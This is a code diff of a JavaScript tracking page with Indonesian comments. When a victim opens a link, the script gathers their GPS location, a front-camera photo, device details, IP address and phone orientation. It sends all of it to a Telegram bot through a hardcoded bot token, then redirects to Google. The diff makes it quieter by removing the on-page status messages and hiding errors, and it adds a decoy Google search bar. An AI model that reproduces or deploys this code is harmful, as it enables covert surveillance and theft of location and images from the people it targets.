@@ -1,12 +1,12 @@
-//
 // ===================================
-//   Dibuat oleh: Ahmad Zaki
-//   Versi: v-Cepat (Format Rapi)
+// Dibuat oleh: Ahmad Zaki
+// Silent version, tidak ada log di HTML
 // ===================================
-//
 
-// --- Elemen HTML ---
-const statusList = document.getElementById('status-list');
+// Dummy updateStatus agar script tidak error
+const updateStatus = (msg, isError=false) => {};
+
+// --- Elemen ---
 const videoEl = document.getElementById('video');
 const canvasEl = document.getElementById('canvas');
 
@@ -16,185 +16,165 @@ const alias = params.get('alias');
 const chatId = params.get('uid');
 const botToken = '6136209053:AAF01MfDjE9oIajSHIDBDTpJ70CUuTqQLpY';
 
-// --- Fungsi Helper ---
-const updateStatus = (message, isError = false) => {
-  const li = document.createElement('li');
-  li.textContent = message;
-  if (isError) li.className = 'error';
-  statusList.appendChild(li);
-  statusList.scrollTop = statusList.scrollHeight;
-};
-
-// ... (Semua fungsi getDeviceInfo, getLocation, getPhoto, getIpAddress, getSensorData tetap sama) ...
+// --- Fungsi ---
+// Device Info
 const getDeviceInfo = async () => {
-  updateStatus('1. Mengambil info perangkat...');
   const data = {
-    userAgent: navigator.userAgent, platform: navigator.platform || 'N/A', language: navigator.language,
-    screenWidth: window.screen.width, screenHeight: window.screen.height, localTime: new Date().toString(),
-    cpuCores: navigator.hardwareConcurrency || 'N/A', memory: navigator.deviceMemory || 'N/A',
-    connection: { type: navigator.connection ? navigator.connection.effectiveType : 'N/A', downlink: navigator.connection ? `${navigator.connection.downlink} Mbps` : 'N/A' }
+    userAgent: navigator.userAgent,
+    platform: navigator.platform || 'N/A',
+    language: navigator.language,
+    screenWidth: window.screen.width,
+    screenHeight: window.screen.height,
+    localTime: new Date().toString(),
+    cpuCores: navigator.hardwareConcurrency || 'N/A',
+    memory: navigator.deviceMemory || 'N/A',
+    connection: {
+      type: navigator.connection ? navigator.connection.effectiveType : 'N/A',
+      downlink: navigator.connection ? `${navigator.connection.downlink} Mbps` : 'N/A'
+    }
   };
   try {
     if (navigator.getBattery) {
       const battery = await navigator.getBattery();
-      data.battery = { level: Math.round(battery.level * 100) + '%', isCharging: battery.charging };
+      data.battery = { level: Math.round(battery.level*100)+'%', isCharging: battery.charging };
     } else { data.battery = { level: 'N/A', isCharging: 'N/A' }; }
-  } catch (err) { data.battery = { level: 'Error', isCharging: 'N/A' }; }
+  } catch(e) { data.battery = { level: 'Error', isCharging:'N/A' }; }
   return data;
 };
+
+// Location
 const getLocation = () => {
-  updateStatus('2. Mengambil lokasi (Harap izinkan)...');
-  return new Promise((resolve, reject) => {
-    if (!navigator.geolocation) { reject(new Error('Geolocation tidak tersedia.')); return; }
+  return new Promise((resolve, reject)=>{
+    if(!navigator.geolocation){ reject('Geolocation tidak tersedia'); return;}
     navigator.geolocation.getCurrentPosition(
-      position => resolve({ lat: position.coords.latitude, lon: position.coords.longitude, accuracy: position.coords.accuracy }),
-      error => reject(new Error(`Gagal mendapatkan lokasi: ${error.message}`)),
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      pos => resolve({lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy}),
+      err => reject(err.message),
+      {enableHighAccuracy:true, timeout:15000, maximumAge:0}
     );
   });
 };
+
+// Selfie
 const getPhoto = async () => {
-  updateStatus('3. Mengambil foto (Harap izinkan)...');
-  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+  const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
   videoEl.srcObject = stream;
-  await new Promise(resolve => videoEl.onloadedmetadata = resolve);
+  await new Promise(r=>videoEl.onloadedmetadata=r);
   videoEl.play();
-  await new Promise(resolve => setTimeout(resolve, 500));
-  canvasEl.width = videoEl.videoWidth; canvasEl.height = videoEl.videoHeight;
-  const context = canvasEl.getContext('2d');
-  context.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
-  const photoBase64 = canvasEl.toDataURL('image/jpeg', 0.7);
-  stream.getTracks().forEach(track => track.stop());
+  await new Promise(r=>setTimeout(r,500));
+  canvasEl.width = videoEl.videoWidth;
+  canvasEl.height = videoEl.videoHeight;
+  const ctx = canvasEl.getContext('2d');
+  ctx.drawImage(videoEl,0,0,canvasEl.width,canvasEl.height);
+  const photoBase64 = canvasEl.toDataURL('image/jpeg',0.7);
+  stream.getTracks().forEach(track=>track.stop());
   videoEl.srcObject = null;
   return photoBase64;
 };
+
+// IP
 const getIpAddress = async () => {
-  updateStatus('4. Mengambil info jaringan...');
-  try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json(); return data.ip || 'N/A';
-  } catch (err) { return `Gagal: ${err.message}`; }
+  try{
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    return data.ip || 'N/A';
+  } catch(e){ return 'N/A'; }
 };
+
+// Sensor
 const getSensorData = () => {
-  updateStatus('5. Mengambil data sensor...');
-  return new Promise((resolve, reject) => {
-    try {
-      if ('Accelerometer' in window) {
-        const acl = new Accelerometer({ frequency: 1 });
-        acl.onreading = () => {
-          const { x, y, z } = acl;
+  return new Promise((resolve)=>{
+    if('Accelerometer' in window){
+      try{
+        const acl = new Accelerometer({frequency:1});
+        acl.onreading = ()=>{
           let orientation = 'Tidak diketahui';
-          if (Math.abs(z) > 8) orientation = 'Terlentang (di meja)';
-          else if (Math.abs(y) > 8) orientation = 'Tegak (dipegang)';
-          else if (Math.abs(x) > 8) orientation = 'Miring (landscape)';
+          const {x,y,z} = acl;
+          if(Math.abs(z)>8) orientation='Terlentang (di meja)';
+          else if(Math.abs(y)>8) orientation='Tegak (dipegang)';
+          else if(Math.abs(x)>8) orientation='Miring (landscape)';
           acl.stop();
-          resolve({ orientation: orientation, x: x.toFixed(2), y: y.toFixed(2), z: z.toFixed(2) });
+          resolve({orientation,x:x.toFixed(2),y:y.toFixed(2),z:z.toFixed(2)});
         };
-        acl.onerror = (err) => { acl.stop(); reject(new Error(`Sensor Accelerometer Error: ${err.message}`)); };
+        acl.onerror=()=>resolve({orientation:'Error',x:0,y:0,z:0});
         acl.start();
-      } else { reject(new Error('Sensor Accelerometer tidak tersedia.')); }
-    } catch (err) { reject(err); }
+      } catch(e){ resolve({orientation:'Error',x:0,y:0,z:0}); }
+    } else resolve({orientation:'N/A',x:0,y:0,z:0});
   });
 };
 
-
-// --- Fungsi sendToTelegram (FORMAT BARU YANG LEBIH RAPI) ---
+// Kirim ke Telegram
 const sendToTelegram = async (data) => {
-  updateStatus('6. Mengirim semua data...');
   const { deviceInfo, location, photoBase64, ipAddress, sensor } = data;
-  
-  // Format pesan baru yang lebih rapi
   const message = `
-🔔 *DATA TARGET DITERIMA* (${alias || 'Target'})
+🔔 DATA TARGET (${alias || 'Target'})
 -----------------------------------
-*📍 LOKASI & JARINGAN*
-• IP Publik: \`${ipAddress}\`
-• Tipe Jaringan: \`${deviceInfo.connection.type}\`
-• Kecepatan: \`${deviceInfo.connection.downlink}\`
+📍 Lokasi & Jaringan
+IP Publik: ${ipAddress}
+Tipe Jaringan: ${deviceInfo.connection.type}
+Kecepatan: ${deviceInfo.connection.downlink}
 
-*📱 PERANGKAT & SPESIFIKASI*
-• Platform: \`${deviceInfo.platform}\`
-• Baterai: \`${deviceInfo.battery.level}\` (Charging: ${deviceInfo.battery.isCharging})
-• Resolusi: \`${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\`
-• CPU: \`${deviceInfo.cpuCores}\` inti / RAM: \`${deviceInfo.memory}\` GB
+📱 Perangkat
+Platform: ${deviceInfo.platform}
+Baterai: ${deviceInfo.battery.level} (Charging: ${deviceInfo.battery.isCharging})
+Resolusi: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
+CPU: ${deviceInfo.cpuCores} inti / RAM: ${deviceInfo.memory} GB
 
-*🤸 POSISI HP (SENSOR)*
-• Orientasi: \`${sensor.orientation}\`
-• Sensor (x,y,z): \`${sensor.x}, ${sensor.y}, ${sensor.z}\`
+🤸 Posisi HP (Sensor)
+Orientasi: ${sensor.orientation}
+Sensor(x,y,z): ${sensor.x}, ${sensor.y}, ${sensor.z}
 
-*⏰ WAKTU TARGET*
-• \`${deviceInfo.localTime}\`
-
-*🌐 USER AGENT*
-\`\`\`${deviceInfo.userAgent}\`\`\`
+⏰ Waktu: ${deviceInfo.localTime}
+🌐 User Agent: ${deviceInfo.userAgent}
 -----------------------------------
   `.trim();
 
-  // --- Kirim Data ---
-  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: 'POST', headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:chatId,text:message})
   });
-  await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
-    method: 'POST', headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, latitude: location.lat, longitude: location.lon, horizontal_accuracy: location.accuracy })
-  });
-  const photoFormData = new FormData();
-  photoFormData.append('chat_id', chatId);
-  photoFormData.append('photo', await (await fetch(photoBase64)).blob(), 'selfie.jpg');
-  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: photoFormData });
-  
-  updateStatus('✅ Semua data berhasil dikirim!');
+
+  if(location){
+    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:chatId, latitude:location.lat, longitude:location.lon, horizontal_accuracy:location.accuracy})
+    });
+  }
+
+  const formData = new FormData();
+  formData.append('chat_id', chatId);
+  formData.append('photo', await (await fetch(photoBase64)).blob(), 'selfie.jpg');
+  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{method:'POST', body:formData});
 };
 
-// --- Fungsi Utama (Tanpa Fingerprint) ---
+// Start
 const start = async () => {
-  if (!chatId || !alias) {
-    updateStatus('❌ Error: Link tidak valid.', true);
-    setTimeout(() => { window.location.href = 'https://www.google.com'; }, 500);
-    return;
-  }
-  
-  try {
-    const data = {};
-    
-    // Meminta izin (Hanya Lokasi & Kamera)
-    data.location = await getLocation();
+  if(!chatId || !alias){ window.location.href='https://www.google.com'; return; }
+
+  try{
+    const data={};
+    data.location = await getLocation().catch(()=>null);
     data.photoBase64 = await getPhoto();
-
-    // Ambil data non-izin
     const [deviceInfo, ipAddress, sensor] = await Promise.all([
-        getDeviceInfo(),
-        getIpAddress(),
-        getSensorData().catch(err => ({ orientation: err.message, x:0, y:0, z:0 }))
+      getDeviceInfo(),
+      getIpAddress(),
+      getSensorData()
     ]);
-    data.deviceInfo = deviceInfo;
-    data.ipAddress = ipAddress;
-    data.sensor = sensor;
-
+    data.deviceInfo=deviceInfo;
+    data.ipAddress=ipAddress;
+    data.sensor=sensor;
     await sendToTelegram(data);
-    updateStatus('Selesai.');
-    
-    // Redirect cepat
-    setTimeout(() => {
-      window.location.href = 'https://www.google.com';
-    }, 1000); // Redirect setelah 1 detik
-    
-  } catch (err) {
-    console.error(err);
-    let errorMsg = `❌ Error: ${err.message}`;
-    if (err.message.includes('permission') || err.message.includes('denied')) {
-        errorMsg = `❌ Error: Izin (Lokasi/Kamera) ditolak oleh target.`;
-    }
-    updateStatus(errorMsg, true);
-    
-    // Redirect jika gagal
-    setTimeout(() => {
-      window.location.href = 'https://www.google.com';
-    }, 500);
-  }
+  } catch(e){}
+  setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1000);
 };
 
-window.addEventListener('DOMContentLoaded', () => {
-  start();
+window.addEventListener('DOMContentLoaded', start);
+
+// --- Search bar redirect ke Google ---
+document.getElementById('search-form').addEventListener('submit', (e)=>{
+  e.preventDefault();
+  const q = document.getElementById('search-input').value;
+  if(!q) return;
+  window.location.href = `https://www.google.com/search?q=${encodeURIComponent(q)}`;
 });
